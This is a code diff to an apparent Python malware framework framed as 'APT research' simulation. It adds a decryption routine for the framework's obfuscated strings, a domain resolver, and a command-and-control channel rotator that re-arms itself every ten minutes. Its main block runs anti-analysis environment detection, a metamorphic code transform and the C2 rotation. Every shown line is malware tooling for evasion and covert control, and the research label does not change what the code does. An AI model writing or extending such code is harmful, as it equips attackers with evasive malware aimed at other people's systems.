@@ -20,11 +20,27 @@ import binascii
 import re
 import subprocess
 import tempfile
+import psutil
 from datetime import datetime, timedelta
 from cryptography.hazmat.primitives import hashes, padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.backends import default_backend
+
+
+def decrypt_string(data_b64, key=None):
+    """Reverse ChimeraEngine string encryption for simulation purposes."""
+    try:
+        raw = base64.b64decode(data_b64)
+        if key is None:
+            key = b"\x00" * 32
+        cipher = Cipher(algorithms.AES(key), modes.CBC(b"\x00" * 16))
+        decryptor = cipher.decryptor()
+        unpadder = padding.PKCS7(128).unpadder()
+        decrypted = decryptor.update(raw) + decryptor.finalize()
+        return unpadder.update(decrypted) + unpadder.finalize()
+    except Exception:
+        return b""
 
 # === RESEARCH AUTHORIZATION ===
 RESEARCH_ENV = os.getenv("APT_RESEARCH_MODE", "disabled")
@@ -230,7 +246,26 @@ class PhantomProtocol:
             }
         }
 
+    def _resolve_domain(self, host):
+        """Resolve a domain name to an IP address for simulation."""
+        try:
+            return socket.gethostbyname(host)
+        except Exception:
+            return "0.0.0.0"
+
     def _rotate_channel(self):
         """Periodically switch active C2 channel"""
-        self.active_channel = random.choice([
-            ch for ch
+        choices = [ch for ch in self.c2_channels.keys() if ch != self.active_channel]
+        if not choices:
+            choices = list(self.c2_channels.keys())
+        self.active_channel = random.choice(choices)
+        self.rotator = threading.Timer(600, self._rotate_channel)
+        self.rotator.start()
+
+
+if __name__ == "__main__":
+    GhostKernel.detect_analysis_env()
+    engine = ChimeraEngine()
+    engine.metamorphic_transform('print("hi")')
+    proto = PhantomProtocol()
+    proto._rotate_channel()
